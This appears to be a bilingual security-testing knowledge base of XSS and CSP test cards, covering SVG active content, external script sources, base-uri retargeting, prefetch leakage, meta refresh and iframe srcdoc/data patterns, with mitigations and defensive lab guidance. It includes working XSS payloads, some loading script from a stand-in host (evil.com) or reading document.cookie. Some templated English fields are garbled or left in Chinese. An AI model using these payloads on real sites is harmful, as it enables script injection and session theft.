description.en: load the same marker through img embedding, standalone navigation, and inline SVG, counting only execution in the actual product rendering path; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

attackChain.payload:
<svg><script>alert(1)</script></svg>
<svg><script>alert(1)</script></svg>
<svg><a><rect width=99% height=99% /><animate attributeName=href values=javascript:alert(1)></svg>
<svg><set attributeName=onload value=alert(1)></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><animate onend=alert(1) attributeName=x dur=1s>
<svg><foreignObject><body xmlns=http://www.w3.org/1999/xhtml><script>alert(1)</script></body></foreignObject></svg>
<svg><use href=data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+></use></svg>
<svg><circle><set onbegin=alert(1) attributename=fill to=red></circle></svg>
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><style><img/src=x onerror=alert(1)></style></svg>

title.zh: 修复并回归“SVG 活动内容注入”
title.en: Retest the SVG Active Content Injection remediation boundary

description.zh: 将用户 SVG 作为隔离下载或可信转换后的位图提供；若必须保留 SVG，使用命名空间感知消毒器移除脚本、事件、foreignObject 与外部引用；随后重放正常内容和最小异常样例，确认业务显示正常且活动内容不再生成。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while the final SVG namespace, surviving active node, and unique execution marker can be correlated after insertion into the DOM no longer appears.

overview.zh: SVG 活动内容注入用于核对 HTML 解析器如何处理当前输出位置。具体审查目标为：上传、富文本或内联模板是否允许 SVG 活动元素和事件穿过消毒边界进入文档命名空间。测试成立的前提为：系统仅按文件扩展名或 image/svg+xml 接受内容，却在同源文档中内联渲染或允许 foreignObject、script 与动画事件。证据要求为：SVG 进入最终 DOM 后的命名空间、被保留的活动节点以及唯一执行标记三者可以关联。响应中出现输入文本或标签并不等同于脚本已经执行。
overview.en: SVG Active Content Injection checks whether upload, rich-text, or inline-template handling lets active SVG elements and events cross the sanitization boundary into the document namespace. It applies when the system trusts an extension or image/svg+xml type but renders the file inline on the application origin or permits foreign Object, script, and animation events. A conclusion requires the final SVG namespace, surviving active node, and unique execution marker can be correlated after insertion into the DOM; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 该问题的输入与输出前提为：系统仅按文件扩展名或 image/svg+xml 接受内容，却在同源文档中内联渲染或允许 foreignObject、script 与动画事件。审查时必须确认“上传、富文本或内联模板是否允许 SVG 活动元素和事件穿过消毒边界进入文档命名空间”，并把服务端响应、最终 DOM、事件条件和浏览器版本关联起来。若无法满足“SVG 进入最终 DOM 后的命名空间、被保留的活动节点以及唯一执行标记三者可以关联”这一证据要求，只能说明输入进入页面，不能确认 XSS。
vulnerability.en: The risk exists when the system trusts an extension or image/svg+xml type but renders the file inline on the application origin or permits foreign Object, script, and animation events, allowing whether upload, rich-text, or inline-template handling lets active SVG elements and events cross the sanitization boundary into the document namespace. Review the input source, final parsing context, browser or policy version, and the final SVG namespace, surviving active node, and unique execution marker can be correlated after insertion into the DOM; otherwise record only an unconfirmed control differential.

exploitation.zh: 分别以 img 引用、独立文件打开和内联 SVG 三种方式加载同一安全标记样例，确认只有真实产品渲染路径中的执行才算成立。为每行样例分配独立的无害标记，每轮只改变一种标签、属性或编码形式；同时保存原始响应、最终 DOM、控制台和事件记录，以排除缓存、浏览器容错及人工交互造成的假阳性。
exploitation.en: In an authorized isolated environment, load the same marker through img embedding, standalone navigation, and inline SVG, counting only execution in the actual product rendering path. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 将用户 SVG 作为隔离下载或可信转换后的位图提供；若必须保留 SVG，使用命名空间感知消毒器移除脚本、事件、foreignObject 与外部引用。修复后在同一输出位置重放普通文本、边界字符和最小异常样例，确认合法内容继续显示，同时活动节点、危险属性和对应执行记录均不再出现。
mitigation.en: Remediation should serve user SVG as an isolated download or trusted rasterized output; when SVG is required, use a namespace-aware sanitizer that removes scripts, events, foreign Object, and external references. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

name.zh: CSP 外部脚本与 JSONP 信任边界
name.en: CSP External Script and JSONP Trust Boundary

description.zh: 使用协议相对外部 script 源验证 CSP 的 script-src 是否错误信任可控主机、宽泛 CDN 或 JSONP 式脚本端点。
description.en: Uses a scheme-relative external script source to test whether CSP script-src overtrusts a controllable host, broad CDN, or JSONP-style script endpoint.

prerequisites.zh: 输入位于可创建 script 元素的 HTML 上下文
prerequisites.en: Input reaches an HTML context capable of creating a script element.

prerequisites.zh: 可在隔离页面和自有脚本域观察 CSP 决策
prerequisites.en: CSP decisions can be observed on an isolated page and controlled script origin.

title.zh: 协议相对外部脚本

description.zh: 将 evil.com 替换为只返回设置内存标记脚本的自有测试域，并记录 CSP 报告、网络请求与 DOM；不要加载第三方代码。
description.en: Replace evil.com with a controlled origin serving only an in-memory marker script and record CSP reports, network requests, and DOM; never load third-party code.

analysis.zh: 分别证明 HTML 注入、脚本源被 CSP 允许和脚本实际执行。仅能外连或 policy 中存在域名不等于可利用 XSS。
analysis.en: Prove HTML injection, CSP allowance, and actual script execution separately. Egress or a hostname in policy alone is not exploitable XSS.

opsecTips.zh: 测试脚本只设置随机内存标记，不读取 Cookie、DOM 数据或发起二次请求。
opsecTips.en: The test script should set only a random in-memory marker and never read cookies, DOM data, or make a second request.

opsecTips.zh: 测试域专用且短时有效，结束后删除脚本并清理 CDN 缓存。
opsecTips.en: Use a dedicated short-lived origin and remove the script and CDN cache afterward.

title.zh: 解析生效的 script-src

description.zh: 记录响应头 policy、重定向和 iframe 继承，确认浏览器实际应用的脚本来源规则。
description.en: Record response policy, redirects, and frame inheritance to identify the browser's effective script-source rules.

title.zh: 加载自有固定标记脚本

description.zh: 替换示例域并提交单一 script 标签，标记脚本只写内存变量。
description.en: Replace the example origin and submit one script tag whose script only sets an in-memory variable.

attackChain.payload: <script src=//evil.com/evil.js></script>

title.zh: 确认 CSP 放行与执行

description.zh: 匹配网络、CSP 报告、DOM 和标记，排除 DNS 预取、扩展与缓存。
description.en: Match network, CSP report, DOM, and marker while excluding DNS prefetch, extensions, and caching.

title.zh: 收敛脚本信任链并回归
title.en: Constrain the script trust chain and regress

description.zh: 改用 nonce/hash 后重放外部脚本与合法脚本，确认前者阻断而应用仍工作。
description.en: After nonce or hash policy, replay external and legitimate scripts to confirm the former is blocked while the app works.

overview.zh: CSP 允许某个外部脚本源时，该源返回的内容拥有页面脚本权限。协议相对 URL 本身不是绕过；只有当前 policy 实际允许攻击者可控源或允许源中的可控 JSONP/上传端点，且脚本在页面执行时才成立。
overview.en: When CSP permits an external script origin, content returned from that origin receives page script privilege. A scheme-relative URL alone is not a bypass; the active policy must allow an attacker-controlled origin or controllable JSONP or upload endpoint and the script must execute.

vulnerability.zh: 根因是 script-src 允许过宽主机、通配子域、可上传脚本的 CDN 或可回调 JSONP 端点，并缺少 nonce/hash 与 strict-dynamic 的可信加载链。HTML 注入可借受信源转化为脚本执行。
vulnerability.en: The cause is an overly broad script-src host, wildcard subdomain, upload-capable CDN, or callback-controlled JSONP endpoint without a nonce or hash and strict-dynamic trust chain. HTML injection can then become script execution through a trusted source.

exploitation.zh: 保存真实响应头中的 CSP，先在无注入页面确认策略，再把 src 指向自有域的固定标记脚本。检查浏览器控制台、CSP report、请求和内存标记。源被阻断、只发生 DNS、或脚本作为文本返回均为阴性。
exploitation.en: Save the effective CSP response header, baseline the page, then point src to a controlled fixed-marker script. Inspect console, CSP reports, network request, and in-memory marker. A blocked source, DNS-only activity, or text response is negative.

mitigation.zh: 优先使用每响应 nonce/hash 与 strict-dynamic，删除宽泛 host allowlist，不信任可上传或 JSONP/CDN 路径。独立修复 HTML 注入，设置 report-to/report-uri 监控违规，并对所有允许脚本源做所有权和可控端点审计。
mitigation.en: Prefer per-response nonces or hashes with strict-dynamic, remove broad host allowlists, and do not trust upload or JSONP or CDN paths. Fix HTML injection independently, monitor violations through reporting, and audit ownership and controllable endpoints for every allowed script source.

name.zh: CSP base-uri 与相对 URL 重定向
name.en: CSP base-uri and Relative URL Retargeting

description.zh: 使用 base 元素验证页面是否缺少 base-uri 限制，并导致相对脚本、表单或导航 URL 被重定向到非预期来源。
description.en: Uses a base element to test whether a missing base-uri restriction retargets relative scripts, forms, or navigation URLs to an unintended origin.

prerequisites.zh: 输入可在 document head 或首个有效 base 之前创建元素
prerequisites.en: Input can create an element in the document head or before the first effective base.

prerequisites.zh: 页面存在可观察的相对 URL 资源且测试域完全受控
prerequisites.en: The page has an observable relative-URL resource and the test origin is fully controlled.

title.zh: 外部 base 元素

description.zh: 将域替换为不提供敏感内容的自有监听器，观察一个无副作用相对资源解析；不要让表单提交或脚本加载携带真实数据。
description.en: Replace the origin with a controlled listener that serves no sensitive content and observe one side-effect-free relative resource; do not submit forms or load scripts carrying real data.

analysis.zh: base 注入的影响由具体被改写资源决定，应报告实际 URL 解析和后续安全边界，不能仅因 document.baseURI 改变就按 XSS 最高影响评级。
analysis.en: Impact depends on the specific retargeted resource. Report actual URL resolution and downstream boundary rather than rating a base URI change as full XSS automatically.

opsecTips.zh: 测试监听器不记录 Cookie/查询敏感值，只验证固定资源名。
opsecTips.en: The listener should not retain cookies or sensitive query values and should verify only a fixed resource name.

opsecTips.zh: 不要点击真实表单或触发脚本；优先观察无害图片/链接解析。
opsecTips.en: Do not submit real forms or trigger scripts; prefer observing a harmless image or link resolution.

title.zh: 记录原始 URL 解析基线

description.zh: 保存 CSP、document.baseURI 和一个无副作用相对资源的绝对解析结果。
description.en: Save CSP, document.base URI, and the absolute resolution of one side-effect-free relative resource.

title.zh: 注入自有 base 来源

description.zh: 替换示例域后提交 base 标签，并保持页面、会话和缓存一致。
description.en: Replace the example origin, submit the base tag, and hold page, session, and cache state constant.

attackChain.payload: <base href=//evil.com/>

title.zh: 确认相对资源重定向

description.zh: 匹配 DOM 属性、document.baseURI、网络请求和 CSP 事件，排除浏览器预取。
description.en: Match DOM attributes, document.base URI, network requests, and CSP events, excluding browser prefetch.

title.zh: 设置 base-uri 并回归

description.zh: 加入限制并修复注入后重放，确认合法相对资源保留而外部基址无效。
description.en: After adding the directive and fixing injection, replay to preserve legitimate relative resources while the external base is ineffective.

overview.zh: base 元素改变文档中相对 URL 的解析基址。它通常不是直接脚本执行，但可把相对脚本、链接或表单指向外部来源；CSP base-uri 可限制哪些 base 生效。
overview.en: A base element changes how relative URLs resolve. It is not usually direct script execution but can retarget relative scripts, links, or forms; CSP base-uri constrains which base values are effective.

vulnerability.zh: 根因是可在有效位置注入 base 元素，且 CSP 未设置 base-uri 'none'/'self'。页面后续相对 URL 因此使用攻击者基址；实际影响取决于 script-src、form-action、资源完整性和用户交互。
vulnerability.en: The cause is base-element injection at an effective position without base-uri 'none' or 'self'. Later relative URLs resolve against the attacker base; impact depends on script-src, form-action, integrity, and user interaction.

exploitation.zh: 记录无注入页面的 document.baseURI 和一个无害相对资源 URL，再注入指向自有域的 base 并比较 DOM 解析与网络请求。只有浏览器实际重定向安全相关资源才成立；标签作为文本、位于首个 base 之后或被 CSP 阻断均为阴性。
exploitation.en: Record document.base URI and one harmless relative resource without injection, then inject a base pointing to a controlled origin and compare DOM resolution and network requests. Count only actual retargeting of a security-relevant resource; text rendering, placement after the first base, or CSP blocking is negative.

mitigation.zh: 修复 HTML 注入，并设置 CSP base-uri 'none' 或至少 'self'。安全相关脚本和提交目标使用可信绝对 URL，配合 script-src、form-action 与 SRI；将 base 固定放在文档前部，避免后续输入抢占。
mitigation.en: Fix HTML injection and set CSP base-uri 'none' or at least 'self'. Use trusted absolute URLs for security-relevant scripts and submissions with script-src, form-action, and SRI, and place the legitimate base early so later input cannot take precedence.

name.zh: CSP Link Prefetch 与 DNS 泄漏
name.en: CSP Link Prefetch and DNS Leakage

description.zh: 使用 prefetch 与 dns-prefetch link 元素验证 HTML 注入是否能触发浏览器向外部来源进行资源预取或 DNS 解析。
description.en: Uses prefetch and dns-prefetch link elements to test whether HTML injection can trigger browser resource prefetching or DNS resolution to an external origin.

prerequisites.zh: 输入可创建 link 元素且浏览器未禁用资源提示
prerequisites.en: Input can create link elements and the browser has not disabled resource hints.

prerequisites.zh: 自有 DNS/HTTPS 监听器能区分唯一测试标记
prerequisites.en: Controlled DNS and HTTPS listeners can distinguish a unique test label.

title.zh: 资源预取与 DNS 预取元素

description.zh: 分别替换为一次性自有子域并逐条渲染，记录 DNS、HTTP、Sec-Purpose/Purpose 等请求特征；不在域名中编码用户数据。
description.en: Replace each with a one-time controlled subdomain, render separately, and record DNS, HTTP, and Sec-Purpose or Purpose signals; never encode user data in the hostname.

analysis.zh: DNS 查询、HTTP 预取和脚本执行是三个不同层级。该卡只覆盖前两者；除非另有敏感数据流，不能把回连写成完整 XSS。
analysis.en: DNS resolution, HTTP prefetch, and script execution are different levels. This card covers only the first two and should not be reported as full XSS without a separate sensitive-data flow.

opsecTips.zh: 子域只包含随机测试 ID，不编码 Cookie、用户名、页面内容或其他数据。
opsecTips.en: Hostnames should contain only a random test ID, never cookies, usernames, page content, or other data.

opsecTips.zh: 使用全新浏览器上下文并关闭第三方扩展，避免预取缓存和扩展流量混淆。
opsecTips.en: Use a fresh browser context without extensions to avoid prefetch cache and extension traffic confusion.

title.zh: 建立文本与资源提示基线

description.zh: 使用新浏览器上下文记录普通文本不会产生 DNS/HTTP 外连。
description.en: Use a fresh browser context to show that plain text causes no DNS or HTTP callback.

title.zh: 逐条提交一次性 link 元素

description.zh: 每行使用不同随机子域并分别渲染，保留 DOM 和监听日志。
description.en: Use a different random subdomain for each line, render separately, and retain DOM and listener logs.

attackChain.payload:
<link rel=prefetch href=//evil.com>
<link rel=dns-prefetch href=//evil.com>

title.zh: 区分 DNS 与资源请求

description.zh: 比较解析、TCP/HTTPS 和预取请求头，准确界定只解析还是下载资源。
description.en: 比较解析、TCP/HTTPS 和预取请求头，准确界定只解析还是下载资源。

title.zh: 编码并收紧富文本策略

description.zh: 修复后重放，确认用户内容为文本或 link 属性被移除且页面正常。
description.en: After remediation replay to confirm user content is text or link attributes are removed while the page works.

overview.zh: prefetch 可能发起资源请求，dns-prefetch 通常只触发 DNS。它们可证明 HTML 元素被浏览器解析并产生外连，但不执行 JavaScript，因此应按网络泄漏/资源提示影响而非完整 XSS 评级。
overview.en: prefetch may request a resource while dns-prefetch usually performs DNS only. They can prove that injected HTML caused browser egress but do not execute Java Script, so rate them as network leakage or resource-hint impact rather than full XSS.

vulnerability.zh: 根因是用户输入进入未编码 HTML 元素上下文，且 CSP/浏览器资源提示策略允许外部目标。若攻击者可将敏感值拼入域名或 URL，可能形成有限数据泄漏；没有敏感数据流时通常只是外连信号。
vulnerability.en: The cause is unencoded input entering an HTML element context while CSP or browser resource-hint policy allows external targets. If sensitive values can be composed into the hostname or URL, limited leakage may occur; without that data flow it is usually only an egress signal.

exploitation.zh: 在全新浏览器上下文中用一次性随机子域分别提交两行，记录 DOM、DNS 和 HTTP 请求并与普通文本对照。仅观察唯一回连可证明元素生效；还需单独证明敏感数据可进入目标 URL 才能声明数据外泄。
exploitation.en: In a fresh browser context submit each line with a one-time random subdomain and record DOM, DNS, and HTTP requests against a text control. A unique callback proves the element worked; sensitive-data exfiltration requires separate proof that data reaches the target URL.

mitigation.zh: 按 HTML 上下文编码并限制富文本允许元素/属性，删除不需要的 link rel 值。配置适当 CSP 来源与浏览器策略，敏感数据不进入可控 URL，并通过 CSP 报告和 DNS 日志监控异常资源提示。
mitigation.en: Apply context-aware HTML encoding and restrict allowed rich-text elements and attributes, removing unnecessary link rel values. Configure appropriate CSP sources and browser policy, keep sensitive data out of controllable URLs, and monitor abnormal resource hints through CSP and DNS logs.

name.zh: Meta Refresh JavaScript URL 边界
name.en: Meta Refresh Java Script URL Boundary

description.zh: 使用 meta refresh 的 javascript: 目标验证浏览器、HTML 消毒器与 CSP 是否阻止元数据驱动的活动 URL。
description.en: Uses a meta refresh javascript target to test whether the browser, HTML sanitizer, and CSP block active URLs in metadata-driven navigation.

prerequisites.zh: 输入可创建 meta 元素并进入有效文档位置
prerequisites.en: Input can create a meta element in an effective document position.

prerequisites.zh: 使用隔离浏览器和无副作用内存标记观察导航/执行
prerequisites.en: An isolated browser and side-effect-free in-memory marker are used to observe navigation or execution.

title.zh: JavaScript Meta Refresh

description.zh: 在隔离页面把 alert 替换为设置随机内存标记，记录元素是否生效、导航 URL、CSP 控制台与最终 DOM。
description.en: On an isolated page replace alert with a random in-memory marker and record whether the element takes effect, navigation URL, CSP console, and final DOM.

analysis.zh: 浏览器版本和文档位置会影响结果，报告需给出 User-Agent、DOM 位置、CSP 与实际导航/标记，不从理论语法直接下结论。
analysis.en: Browser version and document placement affect results. Report user agent, DOM position, CSP, and actual navigation or marker rather than concluding from syntax theory.

opsecTips.zh: 仅使用内存标记，不弹窗、不读取页面数据、不导航到第三方。
opsecTips.en: Use only an in-memory marker with no dialog, page-data read, or third-party navigation.

opsecTips.zh: 在一次性隔离页面测试，避免零秒刷新影响共享会话。
opsecTips.en: Test on a disposable isolated page so zero-delay refresh cannot affect shared sessions.

title.zh: 建立合法 Refresh 基线

description.zh: 在隔离页面确认普通 HTTP 目标的 meta refresh 行为和 CSP。
description.en: On an isolated page confirm normal HTTP meta-refresh behavior and CSP.

title.zh: 提交无害活动 URL 样例

description.zh: 把 alert 改为内存标记并提交，保留 DOM、导航与控制台。
description.en: Replace alert with an in-memory marker, submit it, and retain DOM, navigation, and console data.

attackChain.payload: <meta http-equiv=refresh content=0;url=javascript:alert(1)>

title.zh: 确认浏览器执行边界

description.zh: 证明 URL 被实际解释并触发标记，排除静态 DOM、扩展和开发者工具操作。
description.en: Prove the URL was interpreted and triggered the marker, excluding static DOM, extensions, and Dev Tools actions.

title.zh: 移除 Meta 属性并回归

description.zh: 修复消毒与 CSP 后重放合法及活动 URL，确认前者按业务保留而后者无效。
description.en: After sanitizer and CSP fixes, replay valid and active URLs to preserve business behavior while the latter is inert.

overview.zh: 现代浏览器对 meta refresh 中 javascript: 的支持和限制可能不同，CSP 也只在浏览器实际形成脚本导航时介入。该样例需要真实浏览器验证，不能从标签文本或消毒器输入推断执行。
overview.en: Modern browsers vary in handling javascript URLs in meta refresh, and CSP matters only if the browser forms an active script navigation. This sample requires real-browser verification; execution cannot be inferred from tag text or sanitizer input.

vulnerability.zh: 根因是富文本或模板允许用户创建 meta/http-equiv/content 属性，并且浏览器把目标解释为活动 javascript URL。缺少元素/属性允许列表、输出编码和 CSP 会让 HTML 注入具备导航或执行能力。
vulnerability.en: The cause is rich text or templates allowing user-controlled meta, http-equiv, and content attributes while the browser interprets the destination as an active javascript URL. Missing element and attribute allowlists, encoding, and CSP can give HTML injection navigation or execution impact.

exploitation.zh: 在隔离浏览器先用普通 meta refresh 到自有静态页面建立功能基线，再提交样例的无害标记版本。捕获 DOM、导航、控制台和标记。标签被保留但 URL 不执行、被规范化或阻断均应记录为安全结果。
exploitation.en: Baseline a normal meta refresh to a controlled static page, then submit a harmless-marker version of the sample. Capture DOM, navigation, console, and marker. A retained tag whose URL is inert, normalized, or blocked is a safe result.

mitigation.zh: 用户内容禁止 meta/http-equiv，富文本消毒器采用元素与属性允许列表并拒绝 javascript: 等活动协议。导航由服务端固定 URL 生成，部署严格 script-src/object-src/base-uri CSP，并添加真实浏览器回归。
mitigation.en: Disallow meta and http-equiv in user content, use element and attribute allowlists, and reject active schemes such as javascript. Generate navigation from fixed server URLs, deploy strict script-src, object-src, and base-uri CSP, and add real-browser regression.

name.zh: CSP JavaScript URL、srcdoc 与 data Frame 模式
name.en: CSP Java Script URL, srcdoc, and Data Frame Patterns

description.zh: 使用表单 javascript: 动作、iframe srcdoc 和 data: 文档验证 CSP 对内联脚本、frame-src 与子文档策略继承的实际限制。
description.en: Uses a javascript form action, iframe srcdoc, and data documents to test CSP restrictions on inline script, frame-src, and child-document policy inheritance.

subCategory.zh: CSP 活动 URL 与子文档
subCategory.en: CSP Active URLs and Child Documents

prerequisites.zh: 输入可创建 form 或 iframe 元素并在隔离浏览器观察
prerequisites.en: Input can create form or iframe elements observable in an isolated browser.

prerequisites.zh: 可读取生效 CSP、frame-src/child-src 和 script-src 决策
prerequisites.en: The effective CSP, frame-src or child-src, and script-src decisions are observable.

title.zh: 活动 URL 与 Frame 文档样例
title.en: Active URL and Frame Document Samples

description.zh: 逐条在隔离页面测试，把 alert 替换为各自随机内存标记；表单仅由自动化点击专用按钮，iframe 记录加载、子文档 origin 与 CSP 事件。
description.en: Test each line separately on an isolated page, replacing alert with a unique in-memory marker. Automate only the dedicated form click and record frame load, child origin, and CSP events.

analysis.zh: 分别报告 form javascript、srcdoc、明文 data 和 Base64 data 的加载与执行结果、origin 和 CSP 指令。四行共享主题但不是同一浏览器机制。
analysis.en: Report load and execution, origin, and governing CSP directive separately for javascript forms, srcdoc, plain data, and Base64 data. They share a theme but not one browser mechanism.

opsecTips.zh: 所有 alert 改为内存标记，不读取 Cookie、存储或父文档敏感数据。
opsecTips.en: Replace every alert with an in-memory marker and do not read cookies, storage, or sensitive parent data.

opsecTips.zh: 每个模式使用全新浏览器上下文并关闭共享缓存，结束后销毁。
opsecTips.en: Use a fresh browser context without shared cache for each pattern and destroy it afterward.

title.zh: 解析父子文档 CSP

description.zh: 记录响应头、meta policy、frame-src/child-src、script-src 和预期子文档 origin。
description.en: Record response and meta policy, frame-src or child-src, script-src, and expected child-document origin.

title.zh: 逐条提交无害元素
title.en: Submit harmless elements one by one

description.zh: 每个模式使用不同内存标记并独立刷新浏览器上下文。
description.en: Use a different in-memory marker per pattern and reset the browser context between cases.

attackChain.payload:
<form action=javascript:alert(1)><input type=submit>
<iframe srcdoc="<script>alert(1)</script>">
<iframe src="data:text/html,<script>alert(1)</script>">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

title.zh: 确认执行上下文与来源

description.zh: 匹配标记、父/子 DOM、origin、控制台和 CSP 报告，区分加载与脚本执行。
description.en: Match markers, parent or child DOM, origin, console, and CSP reports to distinguish loading from script execution.

title.zh: 收紧元素和 CSP 后回归
title.en: Regress after element and CSP restrictions

description.zh: 修复消毒和 policy 后重放全部模式及合法 frame，确认业务保留且活动内容阻断。
description.en: After sanitizer and policy fixes replay every pattern and a legitimate frame to preserve business behavior while active content is blocked.

overview.zh: 这些模式跨越三个不同 CSP 边界：javascript: 导航受内联脚本策略影响，srcdoc 子文档继承嵌入上下文策略，data: frame 同时受 frame-src 和不透明来源行为影响。必须逐条验证，不能把一个成功外推到全部模式。
overview.en: These patterns cross three different CSP boundaries: javascript navigation is governed by inline-script policy, srcdoc inherits embedding-context policy, and data frames involve frame-src plus opaque-origin behavior. Test each separately and do not generalize one result to all.

vulnerability.zh: 根因是用户可创建活动 URL 或子文档元素，而 policy 允许 unsafe-inline、data: frame 或过宽 child sources，且应用依赖 CSP 替代 HTML 上下文编码/消毒。HTML 注入与策略缺口组合后才形成执行。
vulnerability.en: The cause is user creation of active URLs or child-document elements while policy allows unsafe-inline, data frames, or broad child sources, and the application relies on CSP instead of HTML encoding or sanitization. Execution requires both HTML injection and a policy gap.

exploitation.zh: 保存生效 policy 和无注入基线，逐条提交无害标记版本。对 form 记录显式点击后的导航；对 frame 记录加载、origin、DOM、控制台和 CSP report。只有对应标记在子/父文档执行才成立，元素存在或 frame 加载本身不足。
exploitation.en: Save the effective policy and clean baseline, then submit harmless-marker versions individually. For form record navigation after an explicit test click; for frames record load, origin, DOM, console, and CSP report. A finding requires the corresponding marker to execute in the child or parent; element presence or frame load alone is insufficient.

mitigation.zh: 修复 HTML 注入并在富文本中禁用 form、iframe、srcdoc 与活动协议。CSP 使用 nonce/hash 且不含 unsafe-inline，frame-src 仅允许必要来源并排除 data:，同时设置 object-src 'none'、base-uri 和 form-action。
mitigation.en: Fix HTML injection and disallow form, iframe, srcdoc, and active schemes in rich text. Use nonce or hash CSP without unsafe-inline, restrict frame-src to required origins excluding data, and set object-src none, base-uri, and form-action.

name.zh: DOM XSS URL 源输入

description.zh: 覆盖 javascript 与 data URL 形式，验证 location、hash、query 等客户端来源进入可执行导航或 HTML sink 时的 DOM XSS。
description.en: Covers javascript and data URL forms to test DOM XSS when location, hash, or query sources reach executable navigation or HTML sinks.

prerequisites.zh: location、hash 或 query 等客户端来源可控，并在真实应用代码中流入导航、HTML 写入或动态代码 sink。
prerequisites.en: A controllable client source such as location, hash, or query flows through real application code into navigation, HTML-writing, or dynamic-code sinks.

prerequisites.zh: 已启用浏览器 source-to-sink 跟踪和 DOM 快照，javascript/data URL 中只保留设置一次性内存标志的 marker。
prerequisites.en: Browser source-to-sink tracing and DOM snapshots are enabled, and javascript or data URLs contain only a marker that sets a one-time in-memory flag.

title.zh: DOM型XSS
title.en: Validation step 1 for DOM XSS URL Source Inputs

execution.command: javascript:alert(1) javascript:alert(document.cookie) javascript:prompt(1) javascript:confirm(1) javascript:void(alert(1)) javascript:void(0)//&alert(1) data:text/html, data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== data:text/html, data:text/html,

description.zh: DOM型XSS包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this DOM XSS URL Source Inputs validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是可控 URL 值沿应用数据流到达可执行 sink，并在应用页面上下文执行 marker；需保留读取源、赋值点与调用栈。 假阳性边界：地址栏包含 javascript 字符串、URL 被显示、普通重定向、浏览器直接手工导航或 CSP 阻止执行均不是 DOM XSS 数据流证据。
analysis.en: Positive evidence requires the controllable URL value to follow the application data flow into an executable sink and run the marker in the application-page context, preserving source read, assignment, and call stack. False-positive boundary: A javascript string in the address bar, URL display, ordinary redirect, manual browser navigation, or CSP-blocked execution is not evidence of a DOM XSS data flow.

opsecTips.zh: DOM XSS URL 测试禁止读取 cookie、storage 或 DOM 敏感字段；发生历史循环、跨源跳转、页面卸载或外连时立即停止。
opsecTips.en: DOM XSS URL testing must not read cookies, storage, or sensitive DOM fields; stop on history loops, cross-origin navigation, page unload, or egress.

opsecTips.zh: 清除测试 query/hash、history 状态、session/local storage 和 marker 节点，恢复路由并重新加载确认 sink 不再收到测试值。
opsecTips.en: Clear test query and hash values, history state, session and local storage, and marker nodes, restore routing, and reload to confirm the sink no longer receives the test value.

title.zh: 追踪“DOM XSS URL 源输入”的客户端来源
title.en: Scope the DOM XSS URL Source Inputs data flow

description.zh: 从 URL、消息或接口值单步跟踪到实际 DOM API，核对前提“源值未经过协议允许列表、Trusted Types 或上下文编码就进入 DOM sink，并且浏览器允许对应 URL 方案或文档类型”及所有中间解码步骤。
description.en: Trace the real input to the final sink or policy decision, confirm that a source value reaches a DOM sink without a protocol allowlist, Trusted Types, or context encoding, and the browser permits the resulting URL scheme or document type, and record browser, response-header, and relevant component versions.

title.zh: 断点核对“DOM XSS 数据流” Sink
title.en: Establish the DOM XSS Data Flow baseline

description.zh: 在读取点和写入点记录运行时值、调用栈与最终 DOM，并采用“DevTools 数据流、最终 sink 值与唯一执行标记可对应到同一次客户端操作，而服务器响应中可以没有该字符串”作为成立标准。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only Dev Tools data flow, the final sink value, and a unique execution marker correlate to one client action even when the server response never contains the string as valid evidence.

title.zh: 单变量验证“DOM XSS URL 源输入”
title.en: Run a single-variable DOM XSS URL Source Inputs check

description.zh: 对 hash、query 与完整 URL 分别设置同一标记，单步跟踪读取、解码和写入位置，确认危险方案是在赋值前还是赋值后形成；保持页面状态不变，逐个来源和 sink 重放原样例，排除导航与 CSP 阻断差异。
description.en: 对 hash、query 与完整 URL 分别设置同一标记，单步跟踪读取、解码和写入位置，确认危险方案是在赋值前还是赋值后形成；保持页面状态不变，逐个来源和 sink 重放原样例，排除导航与 CSP 阻断差异。

title.zh: 替换危险 API 并复测
title.en: Retest the DOM XSS URL Source Inputs remediation boundary

description.zh: 用 textContent 和固定 DOM API 替代 HTML 字符串写入，对导航目标执行 https/http 同源或业务允许列表，并启用 Trusted Types 限制危险 sink；使用相同来源回放正常与异常值，确认安全 API 保留功能且不再产生执行路径。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while Dev Tools data flow, the final sink value, and a unique execution marker correlate to one client action even when the server response never contains the string no longer appears.

overview.zh: DOM XSS URL 源输入审查客户端源到 sink 的完整数据流。需要确认的核心行为为：客户端脚本是否把可控 URL 片段从 location 系列来源传到 href、src、innerHTML 或动态导航等执行 sink。适用前提为：源值未经过协议允许列表、Trusted Types 或上下文编码就进入 DOM sink，并且浏览器允许对应 URL 方案或文档类型。DOM XSS 的证据标准是：DevTools 数据流、最终 sink 值与唯一执行标记可对应到同一次客户端操作，而服务器响应中可以没有该字符串；服务器响应不包含载荷并不能排除客户端问题。
overview.en: DOM XSS URL Source Inputs checks whether client code moves a controllable URL fragment from location-derived sources into executable sinks such as href, src, inner HTML, or dynamic navigation. It applies when a source value reaches a DOM sink without a protocol allowlist, Trusted Types, or context encoding, and the browser permits the resulting URL scheme or document type. A conclusion requires Dev Tools data flow, the final sink value, and a unique execution marker correlate to one client action even when the server response never contains the string; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

